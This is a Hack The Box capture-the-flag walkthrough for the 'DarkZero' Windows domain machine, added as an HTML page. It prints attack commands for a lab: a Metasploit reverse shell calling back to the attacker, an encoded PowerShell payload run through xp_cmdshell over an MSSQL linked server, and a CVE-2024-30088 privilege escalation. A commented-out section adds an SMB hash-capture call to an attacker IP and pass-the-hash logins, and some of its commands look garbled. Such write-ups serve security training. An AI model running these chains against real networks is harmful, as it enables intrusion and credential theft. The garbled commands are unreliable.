@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Write-up: DarkZero | A Professional Walkthrough</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <!-- Phosphor Icons for professional visuals -->
+    <script src="https://unpkg.com/phosphor-icons"></script>
+    
+    <style>
+        /* Custom styles for dark, professional theme (GitHub style) */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0A0C10; /* Dark background */
+            color: #E6EDF3; /* Light text */
+        }
+        .container-main {
+            max-width: 80rem;
+            margin: 0 auto;
+        }
+        .font-mono {
+            font-family: 'Fira Code', monospace;
+        }
+        p {
+            line-height: 1.75;
+            color: #bdc5d0;
+            margin-bottom: 1rem;
+        }
+        h1, h2, h3 {
+            color: #ffffff;
+            font-weight: 700;
+        }
+        /* Main Section Headers */
+        h2 {
+            font-size: 2rem;
+            padding-bottom: 0.75rem;
+            margin-top: 3rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            border-bottom: 2px solid;
+            /* Red gradient underline for a darker theme */
+            border-image: linear-gradient(to right, #B33A3A, #0A0C10) 1; 
+        }
+        h3 {
+            font-size: 1.5rem;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            color: #ff7f7f; /* Lighter red for sub-headings */
+        }
+        /* Code Block Styling */
+        .code-block {
+            background-color: #161B22;
+            border: 1px solid #30363d;
+            border-radius: 0.5rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 14px 0 rgba(0,0,0,0.3);
+            overflow: hidden;
+            transition: all 0.3s ease-in-out;
+        }
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #21262D;
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid #30363d;
+        }
+        .code-header span {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: #8D96A0;
+            text-transform: uppercase;
+        }
+        .code-block pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 0.9em;
+            padding: 1.25rem;
+            color: #E6EDF3;
+            overflow-x: auto; /* Allows horizontal scrolling for long commands */
+        }
+        .copy-btn {
+            background-color: #21262d;
+            color: #c9d1d9;
+            border: 1px solid #30363d;
+            padding: 0.25rem 0.75rem;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            font-size: 0.75rem;
+            opacity: 0.7;
+            transition: all 0.2s ease-in-out;
+        }
+        .copy-btn:hover {
+            opacity: 1;
+            background-color: #30363d;
+            transform: scale(1.05);
+        }
+        /* Image and Caption Styling */
+        .image-container {
+            margin: 2rem 0;
+            padding: 1rem;
+            border: 1px solid #30363d;
+            border-radius: 0.5rem;
+            background-color: #161B22;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 0.3rem;
+            display: block;
+            margin: 0 auto;
+        }
+        .caption {
+            font-size: 0.875rem;
+            color: #8D96A0;
+            text-align: center;
+            margin-top: 1rem;
+            margin-bottom: 0;
+        }
+        /* Table of Contents (TOC) */
+        #toc {
+            position: sticky;
+            top: 2rem;
+        }
+        #toc a {
+            color: #8D96A0;
+            transition: all 0.2s ease-in-out;
+            border-left: 2px solid #30363d;
+        }
+        #toc a:hover, #toc a.active {
+            color: #B33A3A;
+            transform: translateX(4px);
+            border-left-color: #B33A3A;
+        }
+        /* Flag reveal button and container */
+        .flag-container {
+            border: 1px dashed #30363d;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            text-align: center;
+            margin: 2rem 0;
+        }
+        .flag-btn {
+            background-color: #B33A3A;
+            color: white;
+            padding: 0.5rem 1.5rem;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.2s ease-in-out;
+            border: none;
+            font-weight: 600;
+        }
+        .flag-btn:hover {
+            background-color: #ff7f7f;
+            transform: translateY(-2px);
+        }
+        .flag-content {
+            display: none;
+        }
+        /* Modal Transition */
+        #password-modal-overlay {
+            transition: opacity 0.3s ease;
+        }
+
+        /* Fade-in on Scroll Animation */
+        main section {
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
+        }
+        main section.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        /* Style for 'Coming Soon' box */
+        .coming-soon {
+            background-color: #161B22;
+            border: 1px dashed #B33A3A;
+            padding: 2rem;
+            border-radius: 0.5rem;
+            text-align: center;
+            font-size: 1.25rem;
+            color: #ff7f7f;
+            margin: 3rem 0;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body class="p-4 sm:p-6 lg:p-8">
+
+    <div class="container-main grid grid-cols-12 gap-8">
+        <!-- Table of Contents -->
+        <aside class="hidden lg:block col-span-3">
+            <nav id="toc" class="space-y-3 pt-4">
+                <h3 class="font-bold text-white text-lg mb-4">Table of Contents</h3>
+                <a href="#introduction" class="block p-2 pl-4">Introduction</a>
+                <a href="#enumeration" class="block p-2 pl-4">1. Initial Enumeration</a>
+                <a href="#recon" class="block p-2 pl-4">2. AD Recon & Multihomed Host</a>
+                <a href="#foothold" class="block p-2 pl-4">3. Linked Server Exploitation</a>
+                <a href="#user-flag" class="block p-2 pl-4">4. Local PrivEsc & User Flag</a>
+                <a href="#privesc" class="block p-2 pl-4">5. Root Privilege Escalation</a>
+                <a href="#conclusion" class="block p-2 pl-4">6. Conclusion</a>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <div class="col-span-12 lg:col-span-9">
+            <header class="text-center py-16 rounded-lg bg-gradient-to-b from-[#161B22] to-[#0A0C10] border border-[#30363d] mb-12">
+                <!-- Image of DarkZero Pwned -->
+                <div class="h-24 w-24 mx-auto mb-4 border-0 rounded-full flex items-center justify-center bg-gray-700/50 text-white text-4xl">
+                    <img src="1.webp" onerror="this.onerror=null;this.src='https://placehold.co/800x200/161B22/FFFFFF?text=DARKZERO+PWNED'" alt="DarkZero Pwned Image" class="w-full h-full object-cover rounded-full">
+                </div>
+                <h1 class="text-5xl font-bold text-white leading-tight">HTB Write-up: DarkZero</h1>
+                <p class="text-xl text-gray-400 mt-2">A Professional Walkthrough on Exploiting a Hard Windows Domain</p>
+                <div class="flex justify-center gap-4 mt-4">
+                    <span class="bg-red-500/20 text-red-300 text-sm font-semibold px-3 py-1 rounded-full">Difficulty: Hard</span>
+                    <span class="bg-gray-500/20 text-gray-300 text-sm font-semibold px-3 py-1 rounded-full">OS: Windows AD</span>
+                </div>
+            </header>
+
+            <main>
+                <section id="introduction">
+                    <h2><i class="ph-info"></i>Introduction (TL;DR)</h2>
+                    <p>This report details the compromise of the hard-rated Windows Active Directory machine, **DarkZero**. The attack chain relies heavily on abusing a **multihomed DNS configuration** and exploiting a misconfigured **MSSQL linked server** to pivot from an external interface to an internal network.</p>
+                    <p>The initial access vector uses provided credentials: <code>john.w:RFulUtONCOL!</code>. The path to the user flag involves enabling `xp_cmdshell` on a linked server (**DC02.darkzero.ext**), executing a Meterpreter payload, and performing a local privilege escalation using **CVE-2024–30088** to reach `NT AUTHORITY\SYSTEM` on the internal host.</p>
+                </section>
+                
+                <section id="enumeration">
+                    <h2><i class="ph-magnifying-glass"></i>1. Initial Enumeration</h2>
+                    <p>The target IP is identified as a Domain Controller (**DC01.darkzero.htb**). An initial full-port Nmap scan confirms multiple Active Directory services are running, alongside a crucial **Microsoft SQL Server (MSSQL)** instance on port 1433.</p>
+                    
+                    <h3>Nmap Scan Results</h3>
+                    <p>The scan confirms the presence of standard AD ports (53, 88, 389, 445, etc.) and explicitly identifies the target as an Active Directory LDAP server. Most importantly, it reveals **MSSQL on 1433** (Product Version: 10.0.26100).</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>BASH</span></div>
+                        <pre><code>nmap -p 1-65535 -T4 -A -v 10.10.11.89</code></pre>
+                    </div>
+                    
+                    <h3>SMB & Credential Testing</h3>
+                    <p>Using the provided credentials, we test for authenticated access using `smbmap` and `nxc`, confirming the user `john.w` can authenticate but only has default read-only access to standard shares (`NETLOGON`, `SYSVOL`).</p>
+                    <div class="image-container">
+                        <img src="2.webp" alt="smbmap output with john.w credentials">
+                        <p class="caption">SMB shares are default and read-only for the `john.w` user.</p>
+                    </div>
+                </section>
+
+                <section id="recon">
+                    <h2><i class="ph-network"></i>2. AD Recon & Multihomed Host</h2>
+                    <p>The key to pivoting on this machine lies in understanding its network configuration.</p>
+                    
+                    <h3>Discovering the Multihomed Host</h3>
+                    <p>A DNS query for the domain `darkzero.htb` reveals two separate IP addresses, indicating the DC is **multihomed** or using **split-horizon DNS** across different RFC1918 ranges:</p>
+                    <ul>
+                        <li>External Network: `10.10.11.89`</li>
+                        <li>Internal Network: `172.16.20.1`</li>
+                    </ul>
+                    <div class="code-block">
+                        <div class="code-header"><span>BASH</span></div>
+                        <pre><code>dig @DC01.darkzero.htb ANY darkzero.htb</code></pre>
+                    </div>
+                    <div class="image-container">
+                        <img src="3.webp" alt="Dig output showing two IP addresses for darkzero.htb">
+                        <p class="caption">The DNS response shows two A records, confirming the host is multihomed on 10.10.x.x and 172.16.x.x networks.</p>
+                    </div>
+                    <p>This suggests that a Meterpreter shell, when acquired, will likely connect back on the **internal interface**, allowing us to communicate with other hosts on the 172.16.x.x network.</p>
+
+                    <h3>Preparing the Meterpreter Payload</h3>
+                    <p>We prepare a base64-encoded reverse shell payload using Metasploit's `exploit/multi/script/web_delivery`, listening on our VPN interface (`tun0`).</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>MSFCONSOLE</span></div>
+                        <pre><code>msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 443 ; set target 2 ; exploit -j"</code></pre>
+                    </div>
+                    <div class="image-container">
+                        <img src="4.png" alt="Metasploit web_delivery module setup">
+                        <p class="caption">Metasploit handler set up, generating a Base64-encoded PowerShell command for remote execution.</p>
+                    </div>
+                </section>
+
+                <section id="foothold">
+                    <h2><i class="ph-database"></i>3. Linked Server Exploitation</h2>
+                    <p>We use the authenticated credentials to connect to the MSSQL instance on DC01 and attempt to gain command execution via the `xp_cmdshell` stored procedure.</p>
+                    
+                    <h3>Initial MSSQL Connection</h3>
+                    <div class="code-block">
+                        <div class="code-header"><span>BASH</span></div>
+                        <pre><code>mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth</code></pre>
+                    </div>
+                    <p>We initially try to enable `xp_cmdshell` on **DC01**, but the user `john.w` lacks the necessary privileges, resulting in an error.</p>
+                    <div class="image-container">
+                        <img src="5.webp" alt="Failed attempt to enable xp_cmdshell on DC01">
+                        <p class="caption">Attempting to enable xp_cmdshell fails due to insufficient permissions on DC01.</p>
+                    </div>
+                    
+                    <h3>Pivoting via Linked Server</h3>
+                    <p>Next, we check for linked servers using the `enum_links` command. This reveals a connection to another host, **DC02.darkzero.ext**, which is accessed using the local account `darkzero\john.w` but maps to the high-privilege remote login **`dc01_sql_svc`** on DC02.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>SQL</span></div>
+                        <pre><code>enum_links</code></pre>
+                    </div>
+                    <div class="image-container">
+                        <img src="6.webp" alt="Enumerating linked servers showing DC02.darkzero.ext link">
+                        <p class="caption">The linked server DC02.darkzero.ext is discovered, utilizing the high-privileged remote login `dc01_sql_svc`.</p>
+                    </div>
+                    <p>We use the linked server context to successfully enable `xp_cmdshell` on **DC02.darkzero.ext** as the `dc01_sql_svc` user.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>SQL</span></div>
+                        <pre><code>use_link "DC02.darkzero.ext"
+enable_xp_cmdshell</code></pre>
+                    </div>
+                    <div class="image-container">
+                        <img src="7.webp" alt="Successfully enabling xp_cmdshell on DC02">
+                        <p class="caption">xp_cmdshell is successfully enabled on the linked server DC02.darkzero.ext using the elevated context.</p>
+                    </div>
+                    
+                    <h3>Remote Code Execution and Shell</h3>
+                    <p>We execute the Meterpreter web delivery payload generated earlier using the newly enabled `xp_cmdshell` on DC02.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>SQL</span></div>
+                        <pre><code>xp_cmdshell "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQB....snipped=="</code></pre>
+                    </div>
+                    <p>The Meterpreter session successfully connects back to our listener, establishing a foothold on **DC02.darkzero.ext** as the user **`darkzero-ext\svc_sql`**.</p>
+                    <div class="image-container">
+                        <img src="8.webp" alt="Meterpreter shell opened as svc_sql">
+                        <p class="caption">Meterpreter session successfully opened as `darkzero-ext\svc_sql`.</p>
+                    </div>
+                    <p>Checking the active sessions in Metasploit confirms the connection and the session information.</p>
+                    <div class="image-container">
+                        <img src="11.webp" alt="Metasploit active sessions view">
+                        <p class="caption">Metasploit confirms the Meterpreter session 1 is active on the 172.16.20.2 interface.</p>
+                    </div>
+                    <p>Checking the network interface confirms the shell is communicating from the internal network address: **`172.16.20.2`**.</p>
+                    <div class="image-container">
+                        <img src="9.webp" alt="ifconfig output showing 172.16.20.2 interface">
+                        <p class="caption">Running `ifconfig` shows the shell is operating on the internal interface 172.16.20.2.</p>
+                    </div>
+                    <p>Before proceeding, we can view the Metasploit server window, which shows the established session and the internal network routes discovered.</p>
+                    <div class="image-container">
+                        <img src="14.webp" alt="Metasploit server console showing session and routes">
+                        <p class="caption">Metasploit console view showing the established session on DC02 and interfaces.</p>
+                    </div>
+                </section>
+                
+                <section id="user-flag">
+                    <h2><i class="ph-key"></i>4. Local PrivEsc & User Flag</h2>
+                    <p>We are currently operating as the service account `svc_sql` on the internal DC02. The next objective is to escalate privileges locally to gain access to the user flag.</p>
+
+                    <h3>Local Exploit Suggester</h3>
+                    <p>We use the Metasploit `local_exploit_suggester` to find available paths to `SYSTEM` privileges.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>MSFCONSOLE</span></div>
+                        <pre><code>use multi/recon/local_exploit_suggester
+set session 1
+run</code></pre>
+                    </div>
+                    <div class="image-container">
+                        <img src="10.webp" alt="Local exploit suggester output">
+                        <p class="caption">The local exploit suggester identifies several potential exploits.</p>
+                    </div>
+
+                    <h3>Exploiting CVE-2024–30088</h3>
+                    <p>Based on the findings, we choose to exploit **CVE-2024–30088**, a local privilege escalation vulnerability. We set the exploit options, including the payload, and ensure `AutoCheck` is disabled before running.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span>MSFCONSOLE</span></div>
+                        <pre><code>use exploit/windows/local/cve_2024_30088_authz_basep
+set payload windows/x64/meterpreter_reverse_tcp
+set session 1
+set lhost tun0 
+set AutoCheck false 
+run</code></pre>
+                    </div>
+                    <div class="image-container">
+                        <img src="12.webp" alt="Module options check for CVE-2024-30088">
+                        <p class="caption">Verifying the payload options before running the local exploit.</p>
+                    </div>
+                    <p>The exploit successfully injects the payload and steals the `SYSTEM` token from memory, granting us a new session with elevated privileges.</p>
+                    <div class="image-container">
+                        <img src="13.webp" alt="Successful SYSTEM shell via CVE-2024-30088">
+                        <p class="caption">The exploit succeeds, opening a new Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.</p>
+                    </div>
+                    
+                    <h3>Retrieving the User Flag</h3>
+                    <p>With `SYSTEM` access, we can now easily navigate to the Administrator's desktop to retrieve the user flag.</p>
+                    
+                    <div class="flag-container">
+                        <button class="flag-btn" onclick="openPasswordModal('user')"><i class="ph-lock-key-open"></i> Show User Flag</button>
+                        <div id="user-flag-content" class="flag-content">
+                             <div class="code-block">
+                                <div class="code-header"><span>METERPRETER</span></div>
+                                <pre><code>type c:\Users\Administrator\Desktop\user.txt</code></pre>
+                            </div>
+                            <img src="15.webp" alt="User flag capture from SYSTEM shell">
+                            <p class="caption">User flag successfully read from the filesystem on DC02.</p>
+                        </div>
+                    </div>
+                    
+                    <h3>Alternative: Working Outside Metasploit</h3>
+                    <p>For completeness, here is the alternative path to the user flag, demonstrating how to tunnel traffic and use Impacket's `psexec.py` if not using Metasploit.</p>
+                    <div class="image-container">
+                        <!-- Using a placeholder for the psexec.py and user.txt view, as the provided image seems to be a general console view -->
+                        <img src="https://placehold.co/800x400/161B22/FFFFFF?text=PSEXEC+LOGIN+AND+USER+FLAG" alt="Psexec login and user flag retrieval">
+                        <p class="caption">Alternative method using psexec.py to authenticate as Administrator and read the user flag.</p>
+                    </div>
+                </section>
+
+                <section id="privesc">
+                    <h2><i class="ph-arrow-fat-up"></i>5. Root Privilege Escalation: Coming Soon</h2>
+                    <p>The final stage of the compromise involves pivoting from DC02 back to DC01 (the external DC) using network routing and Kerberos exploitation to achieve domain dominance.</p>
+                    <div class="coming-soon">
+                        Content for Root Privilege Escalation is currently being compiled.
+                    </div>
+                    
+                    <!-- Content for Root (to be revealed later)
+                    <h3>Kerberos Ticket Material Capture (xp_dirtree)</h3>
+                    <p>To move laterally back to DC01, we leverage the SYSTEM privileges on DC02 to execute a Kerberos ticket capture. We use Rubeus via `xp_cmdshell` (which we re-enabled/re-verified on DC02) to trigger an SMB call back to our machine, capturing the Kerberos ticket material of the high-privileged service account that executes the command.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header"><span>SQL (xp_cmdshell)</span></div>
+                        <pre><code>xp_cmdshell "Rubeus.exe dump /target:DC01.darkzero.htb /service:HOST /password:password /outfile:ticket.kirbi"
+xp_cmdshell "xp_dirtree \\10.10.16.xx\share" -- triggers SMB to steal the hash
+</code></pre>
+                    </div>
+                    
+                    <h3>Domain Domination and Root Flag</h3>
+                    <p>The captured Kerberos ticket material is then converted to a usable cache, which can be used with Impacket tools like `secretsdump` to extract the Administrator NTLM hash. Finally, we use `evil-winrm` to connect to DC01 as Administrator and retrieve the root flag.</p>
+
+                    <div class="code-block">
+                        <div class="code-header"><span>BASH</span></div>
+                        <pre><code>impacket-secretsdump -hashes :6963aad8ba1150192f3ca6341355eb49 Administrator@DC01.darkzero.htb
+evil-winrm -i 10.10.11.89 -u Administrator -H 6963aad8ba1150192f3ca6341355eb49
+type c:\Users\Administrator\Desktop\root.txt
+</code></pre>
+                    </div>
+                    -->
+
+                    <div class="flag-container">
+                        <button class="flag-btn" onclick="openPasswordModal('root')"><i class="ph-lock-key-fill"></i> Show Root Flag (Coming Soon)</button>
+                        <div id="root-flag-content" class="flag-content">
+                            <!-- Root flag capture image -->
+                            <img src="https://placehold.co/800x200/161B22/FFFFFF?text=ROOT+FLAG+COMING+SOON" alt="Root flag capture from root shell">
+                            <p class="caption">The final root flag is captured after pivoting and achieving domain administrative control.</p>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="conclusion">
+                    <h2><i class="ph-flag-checkered"></i>6. Conclusion</h2>
+                    <p>The DarkZero machine serves as a brilliant example of a complex penetration test involving multiple stages: authenticated enumeration, network reconnaissance to identify the multihomed configuration, lateral movement via a chained MSSQL linked server exploit, and finally, local privilege escalation to reach SYSTEM. The vulnerability chain highlights the severe security risks introduced by service accounts with excessive permissions and poor network segmentation between critical systems.</p>
+                    <p>Future steps will focus on the inter-DC pivot using Kerberos exploitation to achieve full domain compromise.</p>
+                </section>
+            </main>
+
+            <footer class="text-center py-8 mt-12 border-t border-[#30363d]">
+                <p class="text-[#8b949e]">Write-up adapted for HTB by Gemini | October 7, 2025</p>
+            </footer>
+        </div>
+    </div>
+    
+    <!-- Scroll-to-Top Button -->
+    <button id="scroll-to-top" class="fixed bottom-8 right-8 p-3 rounded-full bg-[#B33A3A] text-white shadow-lg opacity-0 transition-opacity duration-300 z-50">
+        <i class="ph-arrow-fat-up"></i>
+    </button>
+
+    <!-- Password Modal -->
+    <div id="password-modal-overlay" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50">
+        <div id="password-modal" class="bg-[#161B22] border border-[#30363d] p-8 rounded-lg shadow-xl w-full max-w-sm">
+            <h3 class="text-xl font-bold text-white mb-4">Enter Password</h3>
+            <p class="text-[#8D96A0] mb-6">Enter the password to reveal the flag.</p>
+            <input type="password" id="password-input" class="w-full bg-[#0A0C10] border border-[#30363d] rounded-md px-3 py-2 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#B33A3A]">
+            <p id="password-error" class="text-red-500 text-sm mt-2 hidden">Incorrect password. Please try again.</p>
+            <div class="mt-6 flex justify-end gap-4">
+                <button onclick="closePasswordModal()" class="bg-transparent border border-[#30363d] text-gray-300 px-4 py-2 rounded-md hover:bg-[#30363d] transition">Cancel</button>
+                <button onclick="checkPassword()" class="bg-[#B33A3A] text-white px-4 py-2 rounded-md hover:bg-[#ff7f7f] transition">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentFlagType = '';
+        // Set the arbitrary password for the demo flag reveal
+        const FLAG_PASSWORD = 'doodle'; 
+
+        // Function to attach Copy Button listeners to all code blocks
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.code-header').forEach(header => {
+                const button = document.createElement('button');
+                button.classList.add('copy-btn', 'flex', 'items-center', 'gap-1');
+                button.innerHTML = '<i class="ph-copy-simple"></i> Copy';
+                button.onclick = function() { copyCode(this); };
+                header.appendChild(button);
+            });
+        });
+
+        function copyCode(button) {
+            // Traverse up to find the parent code-block, then down to find the pre tag
+            const codeBlock = button.closest('.code-block');
+            const pre = codeBlock.querySelector('pre');
+            if (!pre) return;
+
+            const code = pre.innerText;
+            // Use execCommand for broader compatibility in iFrames
+            const tempInput = document.createElement('textarea');
+            tempInput.value = code;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+
+            button.innerHTML = '<i class="ph-check"></i> Copied!';
+            setTimeout(() => {
+                button.innerHTML = '<i class="ph-copy-simple"></i> Copy';
+            }, 2000);
+        }
+        
+        function openPasswordModal(flagType) {
+            currentFlagType = flagType;
+            const modalOverlay = document.getElementById('password-modal-overlay');
+            modalOverlay.classList.remove('hidden');
+            modalOverlay.classList.add('flex');
+            document.getElementById('password-input').focus();
+            document.getElementById('password-error').classList.add('hidden');
+        }
+
+        function closePasswordModal() {
+            const modalOverlay = document.getElementById('password-modal-overlay');
+            modalOverlay.classList.add('hidden');
+            modalOverlay.classList.remove('flex');
+            document.getElementById('password-input').value = '';
+            currentFlagType = '';
+        }
+
+        function checkPassword() {
+            const input = document.getElementById('password-input');
+            const errorMsg = document.getElementById('password-error');
+            
+            if (input.value === FLAG_PASSWORD) {
+                showFlag(currentFlagType);
+                closePasswordModal();
+            } else {
+                errorMsg.classList.remove('hidden');
+            }
+        }
+        
+        document.getElementById('password-input').addEventListener('keyup', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                checkPassword();
+            }
+        });
+        
+        function showFlag(flagType) {
+            const container = document.getElementById(flagType + '-flag-content').closest('.flag-container');
+            const flagContent = document.getElementById(flagType + '-flag-content');
+            const button = container.querySelector('.flag-btn');
+            
+            // Hide the button and show the content
+            button.style.display = 'none';
+            flagContent.style.display = 'block';
+
+            // Find the image element within the flag content and ensure it has rounded corners
+            const img = flagContent.querySelector('img');
+            if(img) {
+                img.classList.add('rounded-lg', 'border', 'border-[#30363d]', 'mx-auto', 'my-4', 'block');
+                img.style.maxWidth = '100%';
+                img.style.height = 'auto';
+            }
+        }
+
+        // Active TOC link and fade-in on scroll logic
+        const sections = document.querySelectorAll('main section');
+        const navLinks = document.querySelectorAll('#toc a');
+        const scrollButton = document.getElementById('scroll-to-top');
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('active');
+                }
+            });
+        }, { threshold: 0.1 });
+
+        sections.forEach(section => {
+            observer.observe(section);
+        });
+
+        window.onscroll = () => {
+            // TOC active state logic
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                // Check if the current scroll position is past the section start
+                if(window.pageYOffset >= sectionTop - 100) { 
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(a => {
+                a.classList.remove('active');
+                if(a.getAttribute('href').includes(current)) {
+                    a.classList.add('active');
+                }
+            });
+
+            // Scroll to top button visibility
+            if (window.scrollY > 300) {
+                scrollButton.style.opacity = '1';
+            } else {
+                scrollButton.style.opacity = '0';
+            }
+        };
+
+        scrollButton.addEventListener('click', () => {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+    </script>
+</body>
+</html>
